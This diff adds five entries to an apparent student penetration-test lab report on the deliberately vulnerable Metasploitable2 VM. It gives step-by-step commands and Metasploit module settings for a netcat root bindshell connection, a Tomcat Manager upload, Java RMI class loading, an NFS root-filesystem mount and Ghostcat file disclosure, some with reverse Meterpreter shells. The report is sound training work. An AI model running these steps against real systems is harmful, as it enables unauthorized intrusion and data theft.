@@ -246,6 +246,187 @@ scan output (as a code block) or reference a screenshot in evidence/recon.png.>
 
 * **Outcome / Impact:** The exploit successfully compromised the PostgreSQL service and established a Meterpreter session with **`postgres` user privileges**. The session did not provide root privileges, but it demonstrated that the database service could be leveraged to execute a payload and obtain remote command access on the target.
 
+## Exploit 5: Exposed Metasploitable Root Shell
+
+* **Service / Port:** Bindshell / 1524
+
+* **Vulnerability:** Exposed unauthenticated root command shell
+
+* **Tool Used:** Netcat (`nc`)
+
+* **Why This Tool:** Netcat can establish a direct TCP connection to the listening bindshell on port 1524, allowing us to interact with the exposed command shell.
+
+* **Steps:**
+
+  1. Confirmed that port 1524 was open using Nmap:
+
+     ```bash
+     nmap -sV 10.0.2.3
+     ```
+  2. Connected directly to the service:
+
+     ```bash
+     nc -nv 10.0.2.3 1524
+     ```
+  3. Verified the obtained privileges:
+
+     ```bash
+     id
+     whoami
+     ```
+
+* **Evidence:** `networking/network-security/evidence/exploit5.png`
+
+* **Cyber Kill Chain Stage(s):**
+
+  * **Reconnaissance:** Nmap identified TCP port 1524 and reported it as the "Metasploitable root shell" service.
+  * **Delivery:** Netcat established a connection from Kali to the exposed service on port 1524.
+  * **Exploitation:** The connection immediately provided access to a command shell without requiring authentication.
+  * **Actions on Objectives:** The `id` and `whoami` commands confirmed that the obtained shell had root privileges.
+
+* **Outcome / Impact:** Successfully obtained an unauthenticated root command shell on Metasploitable2. The shell reported `uid=0(root) gid=0(root)`.
+
+## Exploit 6: Apache Tomcat Manager Upload Code Execution
+
+* **Service / Port:** Apache Tomcat / 8180
+
+* **Vulnerability:** Tomcat Manager authenticated upload code execution
+
+* **Tool Used:** Metasploit — `exploit/multi/http/tomcat_mgr_upload`
+
+* **Why This Tool:** The Metasploitable2 host exposed Apache Tomcat on port 8180. This Metasploit module specifically uploads and deploys a Java payload through the Tomcat Manager application, making it appropriate for obtaining code execution through the exposed Manager interface.
+
+* **Steps:**
+
+  1. Identified Apache Tomcat running on port 8180 during Nmap reconnaissance.
+  2. Selected the Metasploit module `exploit/multi/http/tomcat_mgr_upload`.
+  3. Set `RHOSTS` to `10.0.2.3` and `RPORT` to `8180`.
+  4. Set `TARGETURI` to `/manager`.
+  5. Configured the Tomcat Manager credentials as username `tomcat` and password `tomcat`.
+  6. Set `LHOST` to `10.0.2.15` and `LPORT` to `4444`.
+  7. Ran `check`, which reported that the target appeared vulnerable.
+  8. Ran `exploit`. Metasploit successfully uploaded and deployed a Java payload and opened a Meterpreter session.
+  9. Verified the session using `getuid`, `sysinfo`, and `pwd`.
+
+* **Evidence:** `networking/network-security/evidence/exploit6.png`
+
+* **Cyber Kill Chain Stage(s):**
+
+  * **Reconnaissance:** Nmap identified Apache Tomcat running on port 8180.
+  * **Weaponization:** Metasploit prepared a Java Meterpreter payload for the Tomcat target.
+  * **Delivery:** The payload was uploaded to the Tomcat Manager application.
+  * **Exploitation:** The uploaded application was deployed and executed through the Tomcat Manager interface.
+  * **Installation:** The temporary malicious application was deployed on the Tomcat server, although the module subsequently undeployed it.
+  * **Command & Control (C2):** A reverse Meterpreter connection was established from the target to `10.0.2.15:4444`.
+  * **Actions on Objectives:** The successful Meterpreter session provided command execution and access as the `tomcat55` user.
+
+* **Outcome / Impact:** A Meterpreter session was successfully established on Metasploitable2. The session ran as `tomcat55`, not root. The target system was identified as Linux 2.6.24-16-server (i386), and the working directory was `/`.
+
+
+## Exploit 7: Java RMI Server Insecure Configuration
+
+* **Service / Port:** Java RMI Registry / 1099
+
+* **Vulnerability:** Java RMI Server insecure default configuration with class loading enabled
+
+* **Tool Used:** Metasploit — `exploit/multi/misc/java_rmi_server`
+
+* **Why This Tool:** Nmap identified a Java RMI registry on port 1099, and the Metasploit module specifically targets Java RMI servers that allow remote class loading. The module was therefore appropriate for testing and exploiting this exposed service.
+
+* **Steps:**
+
+  1. Identified the Java RMI registry on port 1099 during reconnaissance.
+  2. Selected `exploit/multi/misc/java_rmi_server` in Metasploit.
+  3. Set `RHOSTS` to `10.0.2.3` and `RPORT` to `1099`.
+  4. Set `SRVHOST` and `LHOST` to `10.0.2.15`.
+  5. Ran `check`, which detected a Java RMI endpoint with class loading enabled and reported that the target was vulnerable.
+  6. Ran `exploit`.
+  7. Metasploit served a payload JAR and sent an RMI call to the target.
+  8. A Meterpreter session was successfully opened.
+  9. Verified the session using `getuid`, `sysinfo`, and `pwd`.
+
+* **Evidence:** `networking/network-security/evidence/exploit7.png`
+
+* **Cyber Kill Chain Stage(s):**
+
+  * **Reconnaissance:** Nmap identified the Java RMI service on port 1099.
+  * **Weaponization:** Metasploit generated a Java Meterpreter payload and prepared it as a JAR.
+  * **Delivery:** The payload was made available through the attacker's HTTP server and requested by the vulnerable RMI service.
+  * **Exploitation:** The RMI server's class-loading configuration allowed the remote payload to be loaded and executed.
+  * **Installation:** The Meterpreter payload was loaded into the target's Java process, establishing the malicious session.
+  * **Command & Control (C2):** The target established a reverse connection to the Kali listener on `10.0.2.15:4444`.
+  * **Actions on Objectives:** The resulting Meterpreter session provided access as the `root` user.
+
+* **Outcome / Impact:** The Java RMI vulnerability was successfully exploited. A Meterpreter session was established with **root privileges** (`uid 0`) on the Metasploitable2 system.
+
+
+## Exploit 8: Unrestricted NFS Root Filesystem Export
+
+* **Service / Port:** NFS / 2049
+
+* **Vulnerability:** Unrestricted NFS export of the target's root filesystem
+
+* **Tool Used:** NFS client utilities — `showmount` and `mount`
+
+* **Why This Tool:** `showmount` identifies directories exported through NFS, while the NFS client can mount an accessible export. These tools directly demonstrate whether the target's filesystem is exposed to the attacker.
+
+* **Steps:**
+
+  1. Nmap reconnaissance identified NFS running on port 2049.
+  2. Ran `showmount -e 10.0.2.3`.
+  3. The target reported `/` as an NFS export available to all hosts (`*`).
+  4. Created a local mount point using `sudo mkdir -p /mnt/msf_nfs`.
+  5. Mounted the exported root filesystem using `sudo mount -t nfs 10.0.2.3:/ /mnt/msf_nfs`.
+  6. Used `ls -la /mnt/msf_nfs` to verify access to the target filesystem.
+  7. The mount output confirmed that the filesystem was mounted with read/write (`rw`) access.
+
+* **Evidence:** `networking/network-security/evidence/exploit8.png`
+
+* **Cyber Kill Chain Stage(s):**
+
+  * **Reconnaissance:** Nmap identified the NFS service, and `showmount` revealed that the root filesystem was exported.
+  * **Delivery:** The attacker requested and mounted the exposed NFS export from the target.
+  * **Exploitation:** The insecure export configuration allowed the attacker to mount the target's root filesystem without appropriate host restrictions.
+  * **Actions on Objectives:** The mounted filesystem provided access to the target's directories and files, including `/etc`, `/home`, `/root`, `/var`, and other system directories.
+
+* **Outcome / Impact:** The target's entire root filesystem was successfully mounted on Kali through NFS. The export was accessible with read/write mount permissions, demonstrating significant unauthorized filesystem exposure.
+
+
+## Exploit 9: Apache Tomcat Ghostcat
+
+* **Service / Port:** Apache JServ Protocol (AJP) / 8009
+
+* **Vulnerability:** Apache Tomcat Ghostcat (CVE-2020-1938)
+
+* **Tool Used:** Metasploit — `auxiliary/admin/http/tomcat_ghostcat`
+
+* **Why This Tool:** This module specifically targets the Ghostcat vulnerability in Tomcat's AJP connector and can retrieve files that should not be directly accessible through the web application.
+
+* **Steps:**
+
+  1. Nmap reconnaissance identified AJP running on TCP port 8009.
+  2. In Metasploit, selected `auxiliary/admin/http/tomcat_ghostcat`.
+  3. Set the target:
+     `set RHOSTS 10.0.2.3`
+  4. Confirmed the AJP port:
+     `set RPORT 8009`
+  5. Requested the Tomcat application configuration file:
+     `set FILENAME /WEB-INF/web.xml`
+  6. Ran the module with `run`.
+  7. The target returned the contents of `/WEB-INF/web.xml`, and Metasploit saved the retrieved file as a loot file.
+
+* **Evidence:** `networking/network-security/evidence/exploit9.png`
+
+* **Cyber Kill Chain Stage(s):**
+
+  * **Reconnaissance:** Nmap identified the exposed AJP service on TCP port 8009.
+  * **Weaponization:** The Metasploit Ghostcat module was selected and configured to exploit the vulnerable AJP connector.
+  * **Delivery:** The malicious AJP request was sent to the target Tomcat server.
+  * **Exploitation:** The vulnerable AJP connector processed the request and returned the contents of `/WEB-INF/web.xml`.
+  * **Actions on Objectives:** The attack achieved unauthorized retrieval of a file from the Tomcat application.
+
+* **Outcome / Impact:** Successful unauthorized file disclosure. The contents of `/WEB-INF/web.xml` were retrieved from the target and saved by Metasploit. No shell or privilege escalation was obtained from this exploit.
+
 
 ## Kill Chain Coverage Summary
 
